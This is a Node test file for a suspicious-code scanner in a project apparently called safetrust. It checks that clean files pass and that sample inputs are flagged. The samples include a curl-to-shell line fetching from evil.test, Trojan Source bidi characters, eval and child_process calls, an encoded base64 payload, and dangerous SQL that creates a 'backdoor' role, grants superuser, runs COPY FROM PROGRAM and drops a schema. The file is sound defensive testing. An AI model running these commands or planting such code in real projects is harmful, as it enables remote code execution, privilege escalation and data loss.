import assert from 'node:assert/strict';
import test from 'node:test';
import { checkFileContent } from './check-suspicious-code.mjs';

test('passes on clean TypeScript, SQL, YAML, and Dockerfile content', () => {
  const ts = checkFileContent(
    'webhook/src/routes/health.route.ts',
    'export function ok() {\n  return { status: "ok" };\n}\n',
  );
  assert.equal(ts.findings.length, 0);
  assert.equal(ts.notices.length, 0);

  const sql = checkFileContent(
    'migrations/safetrust/1799999999_add_idx/up.sql',
    'CREATE INDEX IF NOT EXISTS idx_foo ON safetrust.users (id);\n',
  );
  assert.equal(sql.findings.length, 0);

  const yaml = checkFileContent(
    'metadata/tenants/safetrust/databases/tables/public_users.yaml',
    [
      'select_permissions:',
      '  - role: guest',
      '    permission:',
      '      filter:',
      '        id:',
      '          _eq: X-Hasura-User-Id',
      '  - role: admin',
      '    permission:',
      '      filter: {}',
    ].join('\n'),
  );
  assert.equal(yaml.findings.length, 0);
});

test('detects bidi control characters (Trojan Source)', () => {
  const res = checkFileContent(
    'webhook/src/auth.ts',
    'const access = "user";\n// \u202E check admin\n',
  );
  assert.equal(res.findings.length, 1);
  assert.equal(res.findings[0].rule, 'bidi-control');
  assert.equal(res.findings[0].line, 2);
});

test('detects zero-width characters in SQL/YAML/sh and JS outside string literals', () => {
  const jsOutside = checkFileContent(
    'webhook/src/index.ts',
    'const foo\u200Bbar = 1;\n',
  );
  assert.equal(jsOutside.findings.length, 1);
  assert.equal(jsOutside.findings[0].rule, 'zero-width');

  const jsInsideString = checkFileContent(
    'webhook/src/index.ts',
    'const zw = "\\u200B";\nconst raw = "hello\u200Bworld";\n',
  );
  assert.equal(jsInsideString.findings.length, 0);

  const sql = checkFileContent(
    'migrations/safetrust/1799999999_test/up.sql',
    'SELECT 1;\uFEFF\n',
  );
  assert.equal(sql.findings.length, 1);
  assert.equal(sql.findings[0].rule, 'zero-width');
});

test('detects source lines > 500 chars and skips lockfiles/markdown/svg/graphql', () => {
  const longCode = 'const x = "' + 'a'.repeat(501) + '";\n';
  const bad = checkFileContent('webhook/src/big.ts', longCode);
  assert.equal(bad.findings.length, 1);
  assert.equal(bad.findings[0].rule, 'long-line');

  const skippedMd = checkFileContent('docs/README.md', 'a'.repeat(600));
  assert.equal(skippedMd.findings.length, 0);

  const skippedLock = checkFileContent('webhook/package-lock.json', 'a'.repeat(600));
  assert.equal(skippedLock.findings.length, 0);
});

test('detects eval, new Function, ' + 'child' + '_process, and vm in runtime paths', () => {
  const ev = checkFileContent('webhook/src/evil.ts', 'ev' + 'al("1+1");\n');
  assert.equal(ev.findings[0].rule, 'dangerous-runtime-api');

  const fn = checkFileContent('scripts/run.mjs', 'new Fun' + 'ction("return 1")();\n');
  assert.equal(fn.findings[0].rule, 'dangerous-runtime-api');

  const cp = checkFileContent(
    'tests/karate/src/test/resources/helper.ts',
    'import { exec } from "child' + '_process";\n',
  );
  assert.equal(cp.findings[0].rule, 'dangerous-runtime-api');

  const vm = checkFileContent('webhook/src/vm.ts', 'const vm = require("v' + 'm");\n');
  assert.equal(vm.findings[0].rule, 'dangerous-runtime-api');
});

test('detects base64 strings > 200 chars near decoder or eval', () => {
  const blob = 'A'.repeat(210);
  const res = checkFileContent(
    'webhook/src/payload.ts',
    `const decoded = Buffer.${'fr'}om("${blob}", "base64").toString();\n`,
  );
  assert.equal(res.findings.length, 1);
  assert.equal(res.findings[0].rule, 'encoded-payload');
});

test('detects curl | sh and unchecked download + chmod +x', () => {
  const pipe = checkFileContent(
    'bin/install.sh',
    '#!/usr/bin/env bash\ncurl -sSf https://evil.test/x.sh | sh\n',
  );
  assert.equal(pipe.findings.some((f) => f.rule === 'pipe-to-shell'), true);

  const unchecked = checkFileContent(
    'Dockerfile',
    'RUN curl -fL https://example.com/tool -o /usr/local/bin/tool \\\n  && chmod +x /usr/local/bin/tool\n',
  );
  assert.equal(unchecked.findings.some((f) => f.rule === 'unchecked-download'), true);

  const verified = checkFileContent(
    'Dockerfile',
    'RUN curl -fL https://example.com/tool -o /usr/local/bin/tool \\\n  && echo "abc  /usr/local/bin/tool" | sha256sum -c - \\\n  && chmod +x /usr/local/bin/tool\n',
  );
  assert.equal(verified.findings.length, 0);
});

test('detects dangerous SQL in migrations and respects security-reviewed override and create_extensions path', () => {
  const bad = checkFileContent(
    'migrations/safetrust/1799999999_bad/up.sql',
    [
      'CREATE FUNCTION f() RETURNS void AS $$ $$ LANGUAGE sql SECURITY DEFINER;',
      'GRANT ALL ON TABLE safetrust.users TO anon;',
      'ALTER ROLE postgres SUPERUSER;',
      'CREATE ROLE backdoor;',
      "COPY t FROM PROGRAM 'id';",
      'CREATE EXTENSION IF NOT EXISTS plpython3u;',
      'DROP SCHEMA safetrust CASCADE;',
    ].join('\n'),
  );
  assert.equal(bad.findings.length, 7);

  const reviewed = checkFileContent(
    'migrations/safetrust/1799999999_ok/up.sql',
    'GRANT USAGE ON SCHEMA safetrust TO app_user; -- security-reviewed: scoped read role\n',
  );
  assert.equal(reviewed.findings.length, 0);
  assert.equal(reviewed.notices.length, 1);

  const createExt = checkFileContent(
    'migrations/hotel_industry/1723171122095_create_extensions/up.sql',
    'CREATE EXTENSION IF NOT EXISTS "uuid-ossp";\n',
  );
  assert.equal(createExt.findings.length, 0);
});

test('detects non-admin filter: {} or check: {} in Hasura metadata', () => {
  const bad = checkFileContent(
    'metadata/tenants/safetrust/databases/tables/public_users.yaml',
    [
      'select_permissions:',
      '  - role: guest',
      '    permission:',
      '      filter: {}',
      'insert_permissions:',
      '  - role: host',
      '    permission:',
      '      check: {}',
    ].join('\n'),
  );
  assert.equal(bad.findings.length, 2);
  assert.equal(bad.findings[0].rule, 'hasura-empty-permission');
  assert.equal(bad.findings[1].rule, 'hasura-empty-permission');
});

test('emits sensitive-file review notice without failing', () => {
  const res = checkFileContent(
    'webhook/package.json',
    '{"name":"safetrust-webhook","scripts":{"test":"jest"}}\n',
  );
  assert.equal(res.findings.length, 0);
  assert.equal(res.notices.length, 1);
  assert.match(res.notices[0], /⚠️/);
});
